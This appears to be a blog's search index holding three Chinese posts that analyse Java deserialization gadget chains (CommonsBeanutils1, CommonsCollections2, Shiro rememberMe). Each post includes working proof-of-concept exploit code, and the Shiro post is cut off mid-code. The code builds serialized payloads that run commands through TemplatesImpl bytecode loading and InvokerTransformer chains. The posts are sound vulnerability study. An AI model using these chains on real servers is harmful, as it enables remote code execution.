<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>java链子分析—CommonsBeanutils1</title>
      <link href="/2025/05/10/java-cb1/"/>
      <url>/2025/05/10/java-cb1/</url>
      
        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">不是ccb</span><br><span class="line">是CommonsBeanutils</span><br></pre></td></tr></table></figure><p>上一篇学习了CC2中的<code>java.util.PriorityQueue</code><br>这个类会进行重排序操作触发比较<br>CB1链子的出现是为了找到另一个能够利用的比较器（除触发翻译链外）</p><h3 id="JavaBean"><a href="#JavaBean" class="headerlink" title="JavaBean"></a>JavaBean</h3><p>属性的封装完全符合标准的类叫<code>JavaBean</code><br>例如：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123; <span class="keyword">return</span> <span class="built_in">this</span>.name; &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123; <span class="built_in">this</span>.name = name; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123; <span class="keyword">return</span> <span class="built_in">this</span>.age; &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123; <span class="built_in">this</span>.age = age; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isChild</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age &lt;= <span class="number">6</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="CommonsBeanutils"><a href="#CommonsBeanutils" class="headerlink" title="CommonsBeanutils"></a>CommonsBeanutils</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Apache Commons Beanutils 是 Apache Commons 工具集下的另一个项目，它提供了对普通Java类对</span><br><span class="line">象（也称为JavaBean）的一些操作方法。</span><br></pre></td></tr></table></figure><p>在<code>commons-beanutils</code>中提供了一个静态方法<code>PropertyUtils.getProperty</code>，<br>让使用者可以直接调用任意<code>JavaBean</code>的<code>getter</code>方法，比如：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">PropertyUtils.getProperty(<span class="keyword">new</span> <span class="title class_">Person</span>(), <span class="string">&quot;name&quot;</span>);</span><br></pre></td></tr></table></figure><p>此时，<code>commons-beanutils</code>会自动找到<code>name</code>属性的<code>getter</code>方法，<br>也就是<code>getName</code>，然后调用，获得返回值。</p><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsBeanutils1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object</span></span><br><span class="line"><span class="params">            value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;</span><br><span class="line">                ClassPool.getDefault().get(org.example.evil.EvilTemplatesImpl.class.getName()).toBytecode()</span><br><span class="line">        &#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        <span class="keyword">final</span> <span class="type">BeanComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>();</span><br><span class="line">        <span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;Object&gt;(<span class="number">2</span>,</span><br><span class="line">                comparator);</span><br><span class="line"><span class="comment">// stub data for replacement later</span></span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        setFieldValue(comparator, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">        setFieldValue(queue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;obj, obj&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(queue);</span><br><span class="line">        oos.close();</span><br><span class="line">        System.out.println(Base64.getEncoder().encodeToString(barr.toByteArray()));</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span></span><br><span class="line">                <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object)ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="BeanComparator"><a href="#BeanComparator" class="headerlink" title="BeanComparator"></a>BeanComparator</h3><p>可以看到poc中用到的就是这个<code>BeanComparator</code>比较器<br>这个比较器用于比较两个<code>JavaBean</code>是否相等<br>它的比较方法：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">( <span class="keyword">final</span> T o1, <span class="keyword">final</span> T o2 )</span> &#123;</span><br><span class="line"><span class="keyword">if</span> ( property == <span class="literal">null</span> ) &#123;</span><br><span class="line">        <span class="comment">// compare the actual objects</span></span><br><span class="line">        <span class="keyword">return</span> internalCompare( o1, o2 );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Object</span> <span class="variable">value1</span> <span class="operator">=</span> PropertyUtils.getProperty( o1, property );</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Object</span> <span class="variable">value2</span> <span class="operator">=</span> PropertyUtils.getProperty( o2, property );</span><br><span class="line">        <span class="keyword">return</span> internalCompare( value1, value2 );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> ( <span class="keyword">final</span> IllegalAccessException iae ) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>( <span class="string">&quot;IllegalAccessException: &quot;</span> +</span><br><span class="line">        iae.toString() );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> ( <span class="keyword">final</span> InvocationTargetException ite ) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>( <span class="string">&quot;InvocationTargetException: &quot;</span> +</span><br><span class="line">        ite.toString() );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> ( <span class="keyword">final</span> NoSuchMethodException nsme ) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>( <span class="string">&quot;NoSuchMethodException: &quot;</span> +</span><br><span class="line">        nsme.toString() );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中的这个方法：<code>getProperty()</code>可以用来获取get封装函数<br>回忆之前的<code>TemplatesImpl</code>加载类的方法：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TemplatesImpl#getOutputProperties() -&gt; TemplatesImpl#newTransformer() -&gt;</span><br><span class="line">TemplatesImpl#getTransletInstance() -&gt;</span><br><span class="line">TemplatesImpl#defineTransletClasses() -&gt;</span><br><span class="line">TransletClassLoader#defineClass()</span><br></pre></td></tr></table></figure><p>这个方法：<code>getOutputProperties()</code><br>恰好符合以<code>get</code>开头的JavaBean封装函数的标准<br>那只要控制：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">PropertyUtils.getProperty(<span class="string">&#x27;TemplatesImpl对象&#x27;</span>,<span class="string">&#x27;outputProperties&#x27;</span>);</span><br></pre></td></tr></table></figure><p>就可以调用到<code>TemplatesImpl.getOutputProperties()</code><br>加载恶意类</p><h3 id="恶意类"><a href="#恶意类" class="headerlink" title="恶意类"></a>恶意类</h3><p>这个恶意类必须要适用于<code>TemplatesImpl</code><br>也就是那时候讨论过的继承<code>AbstractTranslet</code><br>如下：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.evil;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilTemplatesImpl</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="comment">// 恶意代码（例如执行命令）</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如此一来就成功实现了命令执行</p>]]></content>
      
      
      <categories>
          
          <category> 知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java链子分析—CommonsCollections2</title>
      <link href="/2025/05/10/java-cc2/"/>
      <url>/2025/05/10/java-cc2/</url>
      
        <content type="html"><![CDATA[<h1 id="CC2"><a href="#CC2" class="headerlink" title="CC2"></a>CC2</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">​​Apache Commons Collections 3.2.1 或 4.0​​（未修复版本）</span><br><span class="line">​​JDK ≤ 8u71​​（高版本JDK需结合其他入口类绕过）</span><br></pre></td></tr></table></figure><h1 id="依赖"><a href="#依赖" class="headerlink" title="依赖"></a>依赖</h1><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections4<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC2POC</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 1. 构造Transformer链</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),  <span class="comment">// 获取Runtime类</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),  <span class="comment">// 反射调用Runtime.getMethod(&quot;getRuntime&quot;)</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),  <span class="comment">// 反射调用getRuntime.invoke(null)</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;  <span class="comment">// 执行calc.exe</span></span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2. 设置TransformingComparator</span></span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(chain);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3. 构造恶意PriorityQueue</span></span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>, comparator);</span><br><span class="line">        queue.add(<span class="number">1</span>);  <span class="comment">// 添加两个元素触发比较逻辑</span></span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4. 生成序列化Payload</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">        oos.writeObject(queue);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 5. 模拟反序列化触发漏洞（实际攻击中需发送此Payload到目标）</span></span><br><span class="line">        <span class="comment">// byte[] payload = baos.toByteArray();</span></span><br><span class="line">        <span class="comment">// ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(payload));</span></span><br><span class="line">        <span class="comment">// ois.readObject();  // 此处会弹出计算器</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><h3 id="TransformingComparator"><a href="#TransformingComparator" class="headerlink" title="TransformingComparator"></a>TransformingComparator</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TransformingComparator 是 Apache Commons Collections 库中的一个 ​</span><br><span class="line">​比较器（Comparator）​​ 实现，</span><br><span class="line">它的核心功能是：​​</span><br><span class="line">在比较两个对象之前，先通过一个 Transformer 对它们进行转换，</span><br><span class="line">再基于转换后的结果进行比较​​。</span><br></pre></td></tr></table></figure><p>看一下具体方法的实现：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">TransformingComparator</span><span class="params">(Transformer&lt;? <span class="built_in">super</span> I, ? extends O&gt; transformer)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>(transformer, ComparatorUtils.NATURAL_COMPARATOR);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">TransformingComparator</span><span class="params">(Transformer&lt;? <span class="built_in">super</span> I, ? extends O&gt; transformer, Comparator&lt;O&gt; decorated)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.decorated = decorated;</span><br><span class="line">    <span class="built_in">this</span>.transformer = transformer;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(I obj1, I obj2)</span> &#123;</span><br><span class="line">    <span class="type">O</span> <span class="variable">value1</span> <span class="operator">=</span> (O)<span class="built_in">this</span>.transformer.transform(obj1);</span><br><span class="line">    <span class="type">O</span> <span class="variable">value2</span> <span class="operator">=</span> (O)<span class="built_in">this</span>.transformer.transform(obj2);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.decorated.compare(value1, value2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也就是说这个类可以实现将两个值通过设定好的翻译器<br>翻译后再进行比较</p><p>调用<code>compare()</code>方法时触发翻译的操作</p><h3 id="PriorityQueue"><a href="#PriorityQueue" class="headerlink" title="PriorityQueue"></a>PriorityQueue</h3><p>既然最后序列化的是他那么就先看一下<code>readObject()</code>方法<br>以及触发比较翻译器<code>compare()</code>方法的路径</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">    <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">    s.defaultReadObject();</span><br><span class="line">    s.readInt(); <span class="comment">// 读取队列大小</span></span><br><span class="line">    queue = <span class="keyword">new</span> <span class="title class_">Object</span>[initialCapacity]; <span class="comment">// 初始化队列数组</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; size; i++)</span><br><span class="line">        queue[i] = s.readObject(); <span class="comment">// 逐个读取元素</span></span><br><span class="line">    heapify(); <span class="comment">// 重建堆结构（关键触发点）</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">heapify</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> (size &gt;&gt;&gt; <span class="number">1</span>) - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">        siftDown(i, (E) queue[i]); <span class="comment">// 从中间节点开始调整堆</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">siftDown</span><span class="params">(<span class="type">int</span> k, E x)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (comparator != <span class="literal">null</span>)  <span class="comment">// 使用自定义Comparator</span></span><br><span class="line">        siftDownUsingComparator(k, x);</span><br><span class="line">    <span class="keyword">else</span>  <span class="comment">// 使用自然顺序</span></span><br><span class="line">        siftDownComparable(k, x);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">siftDownUsingComparator</span><span class="params">(<span class="type">int</span> k, E x)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">half</span> <span class="operator">=</span> size &gt;&gt;&gt; <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (k &lt; half) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">child</span> <span class="operator">=</span> (k &lt;&lt; <span class="number">1</span>) + <span class="number">1</span>; <span class="comment">// 左子节点</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">c</span> <span class="operator">=</span> queue[child];</span><br><span class="line">        <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> child + <span class="number">1</span>;     <span class="comment">// 右子节点</span></span><br><span class="line">        <span class="keyword">if</span> (right &lt; size &amp;&amp; comparator.compare((E) c, (E) queue[right]) &gt; <span class="number">0</span>)</span><br><span class="line">            c = queue[child = right];</span><br><span class="line">        <span class="keyword">if</span> (comparator.compare(x, (E) c) &lt;= <span class="number">0</span>) <span class="comment">// 调用Comparator.compare()</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        queue[k] = c;</span><br><span class="line">        k = child;</span><br><span class="line">    &#125;</span><br><span class="line">    queue[k] = x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如此一来就成功的实现了计算器的弹出</p>]]></content>
      
      
      <categories>
          
          <category> 知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java链子分析—Shiro</title>
      <link href="/2025/04/18/java-shiro/"/>
      <url>/2025/04/18/java-shiro/</url>
      
        <content type="html"><![CDATA[<h1 id="Shiro反序列化"><a href="#Shiro反序列化" class="headerlink" title="Shiro反序列化"></a>Shiro反序列化</h1><p>在CC3的链子中使用了<code>Templateslmpl</code>加载任意恶意类<br>可以执行任意java代码</p><p>它与CC6链子的区别<br>就像php中<code>call_user_func</code>与<code>eval</code>的区别一样<br>造成任意代码执行的<code>eval</code>显然具有更高的价值</p><p>shiro框架的漏洞在rememberme的自动登录上<br>会存一段aes加密的数据在浏览器中，再次访问时通过cookie携带<br>到达后端后反序列化以加载用户数据<br>而这个aes加密有一个默认的Key<br>那么就可以攻击不修改Key的网站</p><h1 id="Shiro链子"><a href="#Shiro链子" class="headerlink" title="Shiro链子"></a>Shiro链子</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollectionsShiro</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] getPayload(<span class="type">byte</span>[] clazzBytes) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;clazzBytes&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getClass&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tme</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap, obj);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">expMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        expMap.put(tme, <span class="string">&quot;valuevalue&quot;</span>);</span><br><span class="line"></span><br><span class="line">        outerMap.clear();</span><br><span class="line">        setFieldValue(transformer, <span class="string">&quot;iMethodName&quot;</span>, <span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 